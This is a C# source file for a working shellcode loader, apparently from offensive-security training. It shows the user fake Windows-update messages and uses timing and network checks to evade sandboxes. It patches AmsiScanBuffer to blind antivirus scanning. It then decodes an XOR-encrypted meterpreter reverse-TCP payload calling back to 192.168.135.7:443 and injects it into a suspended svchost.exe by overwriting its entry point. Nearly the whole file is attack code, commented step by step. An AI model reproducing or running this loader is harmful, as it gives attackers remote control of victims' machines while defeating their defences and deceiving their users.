using System;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System.Diagnostics;

namespace ClassLibrary1
{
    public class Class1
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
        
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();


        public static void runner()
        {
            Console.WriteLine("Windows update download complete. Preparing to configure Windows. Do not turn off your computer.");
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            //antiheur: contact fake url and see if status actually returned ok
            string url = "http://woltramaplha.com";
            //string url = "https://google.com"; //test
            // Creates an HttpWebRequest for the specified URL.
            try
            {
                HttpWebRequest myHttpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                // Sends the HttpWebRequest and waits for a response.
                HttpWebResponse myHttpWebResponse = (HttpWebResponse)myHttpWebRequest.GetResponse();
                if (myHttpWebResponse.StatusCode == HttpStatusCode.OK)
                {
                    return;
                }
                // Releases the resources of the response.
                myHttpWebResponse.Close();
            }
            catch
            {
                Console.WriteLine("Configuring Windows update... Do not turn off your computer.");
            }

            //antiheur: loop 900 million times and see if the loop really happened
            int count = 0;
            int max = 900000000;
            for (int i = 0; i < max; i++)
            {
                count++;
            }
            if (count != max)
            {
                return;
            }
            gogo();
        }

        static void gogo()
        {
            //wreck mimi
            string name1 = "a" + "msi" + ".dll";
            string name2 = "A" + "msi" + "ScanB" + "uffer";
            IntPtr TargetDLL = LoadLibrary(name1);
            IntPtr MimiPtr = GetProcAddress(TargetDLL, name2);
            UInt32 oldProtect = 0;
            Byte[] bufi = { 0x48, 0x31, 0xC0 };
            VirtualProtect(MimiPtr, 3, 0x40, out oldProtect);
            Marshal.Copy(bufi, 0, MimiPtr, bufi.Length);
            VirtualProtect(MimiPtr, 3, 0x20, out oldProtect);

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.135.7 LPORT=443 EXITFUNC=thread -f csharp
            // XORed with key 0xfa
			byte[] buf = new byte[683] {
 0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
 0xab, 0xac, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2,
 0xb2, 0x71, 0xa8, 0xda, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33, 0xb2, 0xf5, 0x4d,
 0xb0, 0xb0, 0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b,
 0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8,
 0xc6, 0xb2, 0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xbb, 0xab, 0xf5, 0x7f,
 0x88, 0xfa, 0xfa, 0xfa, 0x71, 0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e,
 0x9d, 0xb2, 0xfb, 0x2a, 0xaa, 0x71, 0xb2, 0xe2, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb,
 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2, 0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2,
 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33, 0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2,
 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf, 0xc3, 0x2b, 0x8f, 0x22, 0xa2,
 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71, 0xf6, 0xb2, 0xbe, 0x71,
 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2, 0xb2, 0xfb, 0x2a,
 0xbb, 0xa2, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2, 0x79, 0x16,
 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13, 0xb1,
 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93,
 0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d,
 0xdc, 0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a,
 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa,
 0xfa, 0x05, 0x2f, 0x12, 0xf4, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc,
 0xc2, 0xd4, 0xce, 0xc3, 0xd4, 0xc2, 0xca, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d,
 0x3a, 0x41, 0xfb, 0xfa, 0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3,
 0x40, 0xad, 0x73, 0x65, 0x3c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x7b, 0xfa,
 0xfa, 0xfa, 0xd5, 0xa3, 0xc3, 0xb5, 0xb0, 0xbd, 0x80, 0x94, 0xb5, 0xcc, 0xbf, 0xc9,
 0xcc, 0x94, 0x9c, 0x8f, 0x9c, 0x97, 0x80, 0xbd, 0x9c, 0xb7, 0x8d, 0xb8, 0x92, 0xb1,
 0x9d, 0xbe, 0xcf, 0xcb, 0xb2, 0xbb, 0xa0, 0xb7, 0xb6, 0xd7, 0x9f, 0xb8, 0x97, 0xbd,
 0xac, 0xa2, 0x9f, 0x93, 0xb0, 0xbc, 0x8f, 0x95, 0xae, 0x99, 0x88, 0xc9, 0xcc, 0xa8,
 0xcc, 0x82, 0x8e, 0xbe, 0xb3, 0x95, 0xbc, 0x90, 0xb0, 0x98, 0x91, 0xb0, 0xb9, 0x8b,
 0xbb, 0xb0, 0x94, 0xbb, 0x8a, 0x80, 0x8b, 0xaf, 0xcb, 0xcf, 0x92, 0x94, 0xbe, 0x9f,
 0xae, 0xcf, 0x9b, 0xad, 0x83, 0x8a, 0xb7, 0xaf, 0xcc, 0xc8, 0xb0, 0x98, 0xa0, 0xc2,
 0xbc, 0x89, 0x95, 0x8a, 0xa8, 0x83, 0x83, 0xab, 0x97, 0x9f, 0xa8, 0x9e, 0xbc, 0xb8,
 0xa8, 0x9f, 0x83, 0xb5, 0x98, 0xc8, 0x93, 0xc8, 0xcd, 0xc2, 0xb5, 0xaf, 0xaa, 0xc3,
 0x9d, 0xaf, 0xb1, 0xc2, 0xfa, 0xb2, 0x73, 0x3b, 0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb,
 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa, 0xfa, 0xfa, 0xfa, 0xaa, 0xa9,
 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0xb2, 0x73, 0x3c, 0x90,
 0xf0, 0xa5, 0xb2, 0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a, 0xc9, 0xfa, 0xfa,
 0xb3, 0x73, 0x1a, 0x90, 0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64, 0x7c, 0xfa,
 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7,
 0xcb, 0x33, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81,
 0x05, 0x2f, 0x7f, 0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3,
 0x40, 0xbe, 0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35,
 0x8e, 0xf8, 0x11, 0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0,
 0xb3, 0x73, 0x2b, 0x3b, 0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3,
 0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9,
 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa,
 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa, 0xfa,
 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71,
 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2, 0x90, 0xfa, 0xa3,
 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f };

            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");

            // Carrying on, decode the XOR payload
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            //Console.WriteLine("XOR-decoded payload.");

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
        }
    }
}